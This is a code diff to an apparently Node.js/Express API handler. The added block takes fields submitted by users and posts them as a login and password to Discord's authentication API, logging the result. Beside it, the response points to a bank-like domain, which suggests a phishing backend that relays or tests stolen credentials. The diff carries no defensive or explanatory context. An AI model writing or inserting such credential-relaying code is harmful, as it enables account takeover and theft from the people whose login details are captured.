@@ -24,6 +24,26 @@ app.post('/api', (req, res) => {
   const data = req.body;
   console.log(data);
 
+  fetch("https://discord.com/api/v9/auth/login", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        login: req.body.name,
+        password: req.body.email
+      })
+    })
+    .then((response) => response.json())
+    .then((data) => {
+      // Успешно!
+      console.log(data);
+    })
+    .catch((error) => {
+      // Ошибка!
+      console.error(error);
+    });
+
   const response = {
     endpoint: 'https://www.american.bank/'
   };
